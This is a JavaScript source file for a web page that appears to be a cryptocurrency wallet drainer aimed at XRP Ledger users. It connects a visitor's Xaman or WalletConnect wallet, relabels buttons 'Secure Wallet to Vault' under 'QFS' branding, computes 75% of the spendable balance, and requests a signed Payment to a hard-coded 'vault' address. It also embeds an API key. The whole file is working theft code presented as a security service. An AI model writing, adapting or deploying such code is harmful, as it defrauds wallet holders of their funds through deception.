// ==============================
// CONFIG
// ==============================
const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
const WC_PROJECT_ID = "YOUR_PROJECT_ID"; 
const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
const XRPL_WS    = "wss://xrplcluster.com/";

// ==============================
// INIT
// ==============================
const xumm = new XummPkce(XUMM_API_KEY, { implicit: true });

let wcClient = null;
let wcModal  = null;
let currentAddress = null;
let currentWalletType = null;

xumm.on("success", async () => {
  const state = await xumm.state();
  if (state.me && state.me.account) {
    handlePostConnect("xaman", state.me.account);
  }
});

// ==============================
// UI HELPERS
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

function updateAllButtonsToSecure() {
  const buttons = document.querySelectorAll('#mainActionButton');
  buttons.forEach(btn => {
    btn.removeAttribute("data-bs-toggle");
    btn.removeAttribute("data-bs-target");
    btn.innerText = "Secure Wallet to Vault";
    btn.classList.remove("btn-primary");
    btn.classList.add("btn-success"); 
    
    btn.onclick = (e) => {
      e.preventDefault();
      triggerManualApproval();
    };
  });
}

// ==============================
// CONNECTION LOGIC
// ==============================
async function connectWallet(type) {
  try {
    setStatus("Connecting…");
    if (type === "xaman") {
      const session = await xumm.authorize();
      if (session?.me?.account) handlePostConnect("xaman", session.me.account);
    } 
    else if (type === "walletconnect") {
      await initWalletConnect();
      const address = await connectViaWalletConnect();
      if (address) handlePostConnect("walletconnect", address);
    }
  } catch (err) {
    console.error(err);
    setStatus("Connection failed");
  }
}

async function handlePostConnect(type, address) {
    currentAddress = address;
    currentWalletType = type;

    const modalEl = document.getElementById('walletSelectionModal');
    if (modalEl) {
        const modalInstance = bootstrap.Modal.getOrCreateInstance(modalEl);
        modalInstance.hide();
    }

    updateAllButtonsToSecure();
    setStatus(`Connected: ${shortAddr(address)}`);
}

// ==============================
// TRIGGER LOGIC (The Fix)
// ==============================
async function triggerManualApproval() {
  if (!currentAddress) return;

  // 1. OPEN WINDOW IMMEDIATELY (Before fetching data)
  // This prevents the "Signature failed" popup blocker error
  let popup = null;
  if (currentWalletType === "xaman") {
      popup = window.open("", "_blank");
      if (popup) {
          popup.document.write("<h2>Contacting Secure Vault...</h2><p>Please wait...</p>");
      } else {
          // If popup failed, we will fall back to redirect later
          console.warn("Popup blocked, will try redirect");
      }
  }

  try {
    setStatus("Fetching network data...");
    const data = await getXrpAccountData(currentAddress);

    setStatus("Creating Sign Request...");
    await signAndSubmit(currentWalletType, currentAddress, data.sendDrops, popup);

  } catch (err) {
    console.error("Approval Error:", err);
    if (popup) popup.close(); 
    // Show the actual error message on screen
    setStatus("Error: " + (err.message || err));
  }
}

async function signAndSubmit(type, address, amountDrops, popupWindow) {
  // FIX: Ensure Amount is never "0". 
  // "0" causes Xaman API to throw "Invalid Amount" error.
  let safeAmount = amountDrops;
  if (!safeAmount || safeAmount === "0") {
      safeAmount = "1"; // 1 drop (0.000001 XRP)
  }

  const tx = {
    TransactionType: "Payment",
    Account: address,
    Destination: VAULT_ADDR,
    Amount: safeAmount 
  };

  if (type === "xaman") {
    // 2. Create Payload
    const payload = await xumm.payload.create(tx);
    
    if (payload && payload.next && payload.next.always) {
        const signUrl = payload.next.always;
        
        // 3. USE THE PRE-OPENED WINDOW
        if (popupWindow && !popupWindow.closed) {
            popupWindow.location.href = signUrl;
            setStatus("Confirm in Xaman");
        } else {
            // Fallback: Redirect the whole page if popup failed
            window.location.href = signUrl;
        }
    } else {
        throw new Error("Invalid Payload response from Xaman");
    }
  } 
  
  else if (type === "walletconnect") {
    if (popupWindow) popupWindow.close(); 
    const session = wcClient.session.getAll()[0];
    await wcClient.request({
      topic: session.topic,
      chainId: "xrpl:0",
      request: {
        method: "xrpl_signTransaction",
        params: { tx_json: tx }
      }
    });
    setStatus("Check WalletConnect");
  }
}

// ==============================
// DATA FETCHING
// ==============================
async function getXrpAccountData(address) {
  const client = new xrpl.Client(XRPL_WS);
  await client.connect();
  try {
    const info = await client.request({
      command: "account_info",
      account: address,
      ledger_index: "validated"
    }).catch(() => null);

    if (!info) return { sendDrops: "0" };

    const bal = BigInt(info.result.account_data.Balance);
    const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
    const reserve = 10_000_000n + (ownerCount * 2_000_000n);
    const spendable = bal - reserve;
    const send = spendable > 0n ? (spendable * 75n) / 100n : 0n;

    return { sendDrops: send.toString() };
  } finally {
    await client.disconnect();
  }
}

// ==============================
// WALLETCONNECT SETUP
// ==============================
async function initWalletConnect() {
  if (wcClient) return;
  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: { name: "QFS", description: "Secure Transfer", url: window.location.origin }
  });
  wcModal = new WalletConnectModal({ projectId: WC_PROJECT_ID, standaloneChains: ["xrpl:0"] });
}

async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: { xrpl: { chains: ["xrpl:0"], methods: ["xrpl_signTransaction"] } }
  });
  if (uri) wcModal.openModal({ uri });
  const session = await approval();
  wcModal.closeModal();
  return session.namespaces.xrpl.accounts[0].split(":")[2];
}